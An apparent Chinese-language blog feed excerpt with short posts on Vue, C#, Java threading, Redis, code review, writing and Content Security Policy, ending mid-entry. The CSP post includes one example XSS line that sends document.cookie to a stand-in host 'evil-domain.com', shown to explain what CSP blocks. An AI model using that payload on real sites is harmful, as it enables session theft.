        <content type="html"><![CDATA[<h2 id="大量无意义的注释"><a href="#大量无意义的注释" class="headerlink" title="大量无意义的注释"></a>大量无意义的注释</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 获取所有软件列表</span><br><span class="line">getSoftList () &#123;</span><br><span class="line">  this.cacheAllSoftList = require(&apos;./db.json&apos;).agents</span><br><span class="line">  this.allSoftList = this.cacheAllSoftList</span><br><span class="line">&#125;,</span><br><span class="line">// 选择类型</span><br><span class="line">clickTab (obj) &#123;</span><br><span class="line">  this.activeTab = obj.value</span><br><span class="line">&#125;,</span><br><span class="line">// 选择布局</span><br><span class="line">clickLayout (obj) &#123;</span><br><span class="line">  this.activeLayout = obj.value</span><br><span class="line">&#125;,</span><br><span class="line">// 添加resource</span><br><span class="line">onSubmit (item) &#123;</span><br><span class="line">  item.resources.push(this.addResourceForm.name)</span><br><span class="line">&#125;,</span><br><span class="line">// 删除resource</span><br><span class="line">deleteResource (item, index) &#123;</span><br><span class="line">  item.resources.splice(index, 1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>C# 概览</title>
      <link href="/C/C#/C#%20overview/"/>
      <url>/C/C#/C#%20overview/</url>
      
        <content type="html"><![CDATA[<h2 id="语言层面"><a href="#语言层面" class="headerlink" title="语言层面"></a>语言层面</h2><h2 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h2><ul><li>NUGET</li></ul><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><ul><li>.NET</li><li>.NET core</li></ul>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>C# ORM</title>
      <link href="/C/C#/C#%20ORM/"/>
      <url>/C/C#/C#%20ORM/</url>
      
        <content type="html"><![CDATA[<h2 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h2><ul><li>Dapper 轻量级SQL映射工具，对标mybatis</li><li>Entity Framework 重量级 对标hibernate</li></ul>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 并发和多线程</title>
      <link href="/java/java/java-cocurrent/"/>
      <url>/java/java/java-cocurrent/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-多线程的几种实现方式"><a href="#Java-多线程的几种实现方式" class="headerlink" title="Java 多线程的几种实现方式"></a>Java 多线程的几种实现方式</h2><h3 id="通过实现-Runnable-接口；"><a href="#通过实现-Runnable-接口；" class="headerlink" title="通过实现 Runnable 接口；"></a>通过实现 Runnable 接口；</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunnableDemo</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> Thread t;</span><br><span class="line">   <span class="keyword">private</span> String threadName;</span><br><span class="line">   </span><br><span class="line">   RunnableDemo( String name) &#123;</span><br><span class="line">      threadName = name;</span><br><span class="line">      System.out.println(<span class="string">"Creating "</span> +  threadName );</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Running "</span> +  threadName );</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">4</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Thread: "</span> + threadName + <span class="string">", "</span> + i);</span><br><span class="line">            <span class="comment">// 让线程睡眠一会</span></span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;<span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         System.out.println(<span class="string">"Thread "</span> +  threadName + <span class="string">" interrupted."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">"Thread "</span> +  threadName + <span class="string">" exiting."</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Starting "</span> +  threadName );</span><br><span class="line">      <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123;</span><br><span class="line">         t = <span class="keyword">new</span> Thread (<span class="keyword">this</span>, threadName);</span><br><span class="line">         t.start ();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">      RunnableDemo R1 = <span class="keyword">new</span> RunnableDemo( <span class="string">"Thread-1"</span>);</span><br><span class="line">      R1.start();</span><br><span class="line">      </span><br><span class="line">      RunnableDemo R2 = <span class="keyword">new</span> RunnableDemo( <span class="string">"Thread-2"</span>);</span><br><span class="line">      R2.start();</span><br><span class="line">   &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过继承Thread来创建线程"><a href="#通过继承Thread来创建线程" class="headerlink" title="通过继承Thread来创建线程"></a>通过继承Thread来创建线程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadDemo</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> Thread t;</span><br><span class="line">   <span class="keyword">private</span> String threadName;</span><br><span class="line">   </span><br><span class="line">   ThreadDemo( String name) &#123;</span><br><span class="line">      threadName = name;</span><br><span class="line">      System.out.println(<span class="string">"Creating "</span> +  threadName );</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Running "</span> +  threadName );</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">4</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Thread: "</span> + threadName + <span class="string">", "</span> + i);</span><br><span class="line">            <span class="comment">// 让线程睡眠一会</span></span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;<span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         System.out.println(<span class="string">"Thread "</span> +  threadName + <span class="string">" interrupted."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">"Thread "</span> +  threadName + <span class="string">" exiting."</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Starting "</span> +  threadName );</span><br><span class="line">      <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123;</span><br><span class="line">         t = <span class="keyword">new</span> Thread (<span class="keyword">this</span>, threadName);</span><br><span class="line">         t.start ();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">      ThreadDemo T1 = <span class="keyword">new</span> ThreadDemo( <span class="string">"Thread-1"</span>);</span><br><span class="line">      T1.start();</span><br><span class="line">      </span><br><span class="line">      ThreadDemo T2 = <span class="keyword">new</span> ThreadDemo( <span class="string">"Thread-2"</span>);</span><br><span class="line">      T2.start();</span><br><span class="line">   &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过-Callable-和-Future-创建线程"><a href="#通过-Callable-和-Future-创建线程" class="headerlink" title="通过 Callable 和 Future 创建线程"></a>通过 Callable 和 Future 创建线程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallableThreadTest</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        CallableThreadTest ctt = <span class="keyword">new</span> CallableThreadTest();  </span><br><span class="line">        FutureTask&lt;Integer&gt; ft = <span class="keyword">new</span> FutureTask&lt;&gt;(ctt);  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">" 的循环变量i的值"</span>+i);  </span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">20</span>)  </span><br><span class="line">            &#123;  </span><br><span class="line">                <span class="keyword">new</span> Thread(ft,<span class="string">"有返回值的线程"</span>).start();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">try</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            System.out.println(<span class="string">"子线程的返回值："</span>+ft.get());  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e)  </span><br><span class="line">        &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e)  </span><br><span class="line">        &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">for</span>(;i&lt;<span class="number">100</span>;i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">" "</span>+i);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> i;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建线程的三种方式的对比"><a href="#创建线程的三种方式的对比" class="headerlink" title="创建线程的三种方式的对比"></a>创建线程的三种方式的对比</h3><ol><li>采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。</li><li>使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。</li><li>推荐使用 Callbale 方式，因为可以得到线程中的返回值和异常</li></ol><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><p>多线程代码中，变量会存在共享，但是如果操作不是原子性的，会造成一致性的问题。 在保证线程安全中Java提供了一些措施。</p><h3 id="同步操作和只读操作"><a href="#同步操作和只读操作" class="headerlink" title="同步操作和只读操作"></a>同步操作和只读操作</h3><p>1.方法的调用是在栈中完成的，因此方法的调用不会造成线程安全的问题。这也是为什么Spring 中使用Bean管理对象，每一次请求的操作可以视为同步行为，可以避免多线程问题。</p><p>2.Java中一些对象是线程安全的，是通过使用了只读操作完成的，例如每一个String都是新的对象，在解决线程安全问题的同时需要注意性能问题。</p><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h3><p>Java语言提供了一种稍弱的同步机制，即volatile变量，用来确保将变量的更新操作通知到其他线程。当把变量声明为volatile类型后，编译器与运行时都会注意到这个变量是共享的，因此不会将该变量上的操作与其他内存操作一起重排序。volatile变量不会被缓存在寄存器或者对其他处理器不可见的地方，因此在读取volatile类型的变量时总会返回最新写入的值。</p><p>volatile 并不能解决线程安全问题，但是需要注意，赋值操作不是原子性的，因此需要使用volatile来保证变量的可见性。</p><h3 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h3><p>synchronized 有两种使用方法同步代码块和同步方法，同步代码块可以传入一个需要锁定的对象，通常是this，而同步方法可以用来修饰方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="comment">/* body */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123; <span class="comment">/* body */</span> &#125; &#125;</span><br></pre></td></tr></table></figure><p>需要注意的是如果是类当中的静态变量 synchronized 并不会锁住</p><p>需要使用类名来锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="comment">/* body */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123; <span class="comment">/* body */</span> &#125; &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/java/java-performance/"/>
      <url>/uncategorized/java/java-performance/</url>
      
        <content type="html"><![CDATA[<hr><p>title: Java 性能调优<br>categories: java</p><h2 id="toc-true"><a href="#toc-true" class="headerlink" title="toc: true"></a>toc: true</h2><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>-《Java性能权威指南》</p><h1 id="性能优化的一些原则"><a href="#性能优化的一些原则" class="headerlink" title="性能优化的一些原则"></a>性能优化的一些原则</h1><ul><li>性能优化需要注意性价比，避免过早优化</li><li>找出性能瓶颈比优化更重要</li><li>JVM性能优化只是非常小的一部分，更重要的是数据库和业务逻辑</li><li>优化之前使用性能测试工具，进行基准测试</li></ul><h1 id="性能优化工具"><a href="#性能优化工具" class="headerlink" title="性能优化工具"></a>性能优化工具</h1><h2 id="操作系统工具"><a href="#操作系统工具" class="headerlink" title="操作系统工具"></a>操作系统工具</h2><ul><li>vmstat 查看CPU利用率</li><li>typeperf CPU运行队列</li><li>iostat 磁盘IO使用率</li><li>nicstat 网络使用率</li></ul><h2 id="Java-性能分析工具"><a href="#Java-性能分析工具" class="headerlink" title="Java 性能分析工具"></a>Java 性能分析工具</h2><ul><li>jcmd 显示JVM 信息工具<ul><li>jcmd jinfo 显示JVM运行参数</li><li>jdcmd process_id 显示栈运行信息 </li></ul></li><li>jsstack 显示栈运行信息</li><li>jconsole 显示Java编译</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Redis 基础</title>
      <link href="/devops/storage/Redis%20foundation/"/>
      <url>/devops/storage/Redis%20foundation/</url>
      
        <content type="html"><![CDATA[<p>官网: <a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a><br>基础教程：<a href="http://www.runoob.com/redis/redis-java.html" target="_blank" rel="noopener">http://www.runoob.com/redis/redis-java.html</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><h2 id="常用的数据结构"><a href="#常用的数据结构" class="headerlink" title="常用的数据结构"></a>常用的数据结构</h2><ul><li>String: 字符串</li><li>Hash: 散列</li><li>List: 列表</li><li>Set: 集合</li><li>Sorted Set: 有序集合</li></ul><h2 id="cli常用操作"><a href="#cli常用操作" class="headerlink" title="cli常用操作"></a>cli常用操作</h2>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安全管理</title>
      <link href="/security/security/security%20management/"/>
      <url>/security/security/security%20management/</url>
      
        <content type="html"><![CDATA[<h2 id="网络威胁建模"><a href="#网络威胁建模" class="headerlink" title="网络威胁建模"></a>网络威胁建模</h2><p>微软的 Threat Modeling 是微软公司开发人员用于鉴别风险、并依据它作出更加设计、编码和测试决定的顶级安全分析方法学之一</p><p>Tool <a href="https://docs.microsoft.com/zh-cn/azure/security/azure-security-threat-modeling-tool-feature-overview" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/azure/security/azure-security-threat-modeling-tool-feature-overview</a></p><h2 id="跨功能安全需求"><a href="#跨功能安全需求" class="headerlink" title="跨功能安全需求"></a>跨功能安全需求</h2>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一些写作技巧</title>
      <link href="/reading-writing/reading&amp;writing/writing%20skils/"/>
      <url>/reading-writing/reading&amp;writing/writing%20skils/</url>
      
        <content type="html"><![CDATA[<p>公司的内部刊物发表了很多技术和商业相关的文章，很多时候读起来非常晦涩。相比之下一些公众号的文章读起来特别轻松，通过分析公众号爆款文章的后，发现一些有意思的特点。</p><ul><li>内容具有普适性，越通俗、接地气的文章看得人越多，那些专业的计算机、财务相关的文章一般没人看，倒是大众心理学、情感类的文章传播的非常迅速</li><li>分享知识的文章不如讲道理的文章；讲道理的文章不如讲故事的文章</li><li>目标受众越明确越好，越能击中读者的内心</li></ul><h2 id="对写作类型进行分类"><a href="#对写作类型进行分类" class="headerlink" title="对写作类型进行分类"></a>对写作类型进行分类</h2><ul><li>传播知识和总结的文章</li><li>讲述道理和个人感悟的文章</li><li>通过故事传达某个理念的文章</li></ul><h2 id="文章的结构的设计"><a href="#文章的结构的设计" class="headerlink" title="文章的结构的设计"></a>文章的结构的设计</h2><ul><li>三段论是经典的作文结构。通过点题说明文章主旨，吸引读者继续阅读；其次分段阐述论点，其中穿插一些故事或者引用作为证据证明；最后总结，回顾全文。</li></ul><h2 id="其他奇巧淫技"><a href="#其他奇巧淫技" class="headerlink" title="其他奇巧淫技"></a>其他奇巧淫技</h2><ul><li>总结不要用“总结”这个标题，让结尾更为自然</li><li>文章的开始可以埋一些伏笔，就像相声的抖包袱</li><li>文章是改出来的，不是一次成型的</li></ul>]]></content>
      
      
      <categories>
          
          <category> reading&amp;writing </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码审查的注意事项</title>
      <link href="/engineered/engineered/code%20review%20tips/"/>
      <url>/engineered/engineered/code%20review%20tips/</url>
      
        <content type="html"><![CDATA[<h2 id="通用-TIPS"><a href="#通用-TIPS" class="headerlink" title="通用 TIPS"></a>通用 TIPS</h2><ul><li>Naming should be correct and abide by the convention<ul><li>file convention </li><li>class convention </li><li>variable convention </li></ul></li><li>Hard code string and number should be refactored as constant </li><li>Keep all environment consistent </li><li>Should not expose password and private key<ul><li>Store sensitive data to environment </li><li>Store crendential to CI tool</li></ul></li><li>Remove useless comment and useless console statement </li><li>Remove any sensitive information in PROD</li><li>Remove useless file and method </li><li>Remove useless import </li><li>Import submodule as far as possible </li></ul><h2 id="Review-Java"><a href="#Review-Java" class="headerlink" title="Review Java"></a>Review Java</h2><ul><li>Should not use snapshot version </li><li>Null should be check when try to access attribute of it</li><li>Comparision should be use ‘equal’ instead of ‘==’</li><li>Util methods  should be static</li><li>Checkstyle should be turned on </li></ul><h2 id="Review-frontend"><a href="#Review-frontend" class="headerlink" title="Review frontend"></a>Review frontend</h2><ul><li>Eslint should be turned on </li><li>Component should be reused and context unrelated</li><li>Html should be sematic</li><li>Interface of component should be easy to use </li></ul>]]></content>
      
      
      <categories>
          
          <category> engineered </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue overview</title>
      <link href="/frontend/frontend/vue/"/>
      <url>/frontend/frontend/vue/</url>
      
        <content type="html"><![CDATA[<h2 id="VUE-核心特性"><a href="#VUE-核心特性" class="headerlink" title="VUE 核心特性"></a>VUE 核心特性</h2><h2 id="VUE-生态"><a href="#VUE-生态" class="headerlink" title="VUE 生态"></a>VUE 生态</h2><h3 id="UI框架"><a href="#UI框架" class="headerlink" title="UI框架"></a>UI框架</h3><ul><li>vuetifyjs</li><li>Mintui</li><li>Quasar</li><li>Vux</li></ul>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSP 浏览器内存安全策略</title>
      <link href="/security/security/csp-in-browser/"/>
      <url>/security/security/csp-in-browser/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP?"></a>什么是CSP?</h2><p>这里一段定义是来自于MDN社区</p><blockquote><p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware.</p></blockquote><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。</p><p>参考来源</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></p><h2 id="使用CSP的两种方式"><a href="#使用CSP的两种方式" class="headerlink" title="使用CSP的两种方式"></a>使用CSP的两种方式</h2><ul><li>通过服务器 HTTP 头部的 Content-Security-Policy 来指定</li><li><p>通过 HTML 文档的 meta 标签配置策略</p><p>例如：</p><p>使用 HTTP 头部，这里的 policy 为策略字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: policy</span><br></pre></td></tr></table></figure></li></ul><p>使用 HTML meta 标签的方式</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; img-src https://*; child-src 'none';"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="主要防范目标"><a href="#主要防范目标" class="headerlink" title="主要防范目标"></a>主要防范目标</h2><p> CSP主要是防范 XSS 攻击，以及报告 XSS 攻击，如果页面存在漏洞让 JS 脚本注入，CSP 能限制脚本的运行，然后把损失降到最小</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p> CSP 是通过限制加载到页面上的资源、域或者协议来实现的，例如，一旦入侵者找到漏洞注入了XSS攻击，入侵者可以通过 图片Ping的方式发送敏感信息到外部网站。CSP 可以指定允许信任域名下的图片、Script和样式表被加载到页面上，及时入侵者 XSS 入侵成功也无法通过这些方式发送数据，保证网站一定程度上安全。</p><p> TODO 几个例子限制加载的资源</p><p>另外 CSP 也提供了只允许加载指定协议，例如HTTPS的资源，否则自动跳转到 HTTPS 版本。</p><h2 id="使用-CSP"><a href="#使用-CSP" class="headerlink" title="使用 CSP"></a>使用 CSP</h2><p>当我们需要使用CSP生效就需要编写相应的策略，策略包括一系列指令组成和设置定的值组成。</p><p>例如，一个网站管理者允许内容来自信任的域名及其子域名 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; *.trusted.com</span><br></pre></td></tr></table></figure><p>我们再看一条策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</span><br></pre></td></tr></table></figure><p>这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。</p><p>TODO 描述 行内脚本</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><host-source></host-source></p><p><scheme-source><br>    self<br>    unsafe-inline<br>    unsafe-eva<br>    none<br>    nonce-&lt;base64值&gt;<br>    strict-dynamic</scheme-source></p><p>### </p><p> TODO 讲解这几种模式</p><h2 id="报告违规情况"><a href="#报告违规情况" class="headerlink" title="报告违规情况"></a>报告违规情况</h2><p>CSP 提供了另外一个非常有用的模式 - 报告模式，如果在 HTTP 头部指定 Content-Security-Policy-Report-Only 可以将发生了任何违规的事件都会被报告出去，但是这个头部只会对报告生效，实际生效还是需要 在Content-Security-Policy 中指定。</p><p>在报告的策略中需要配置一个 report-uri 用于服务器接受违规报告情况，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Content-Security-Policy: default-src &apos;self&apos;; report-uri 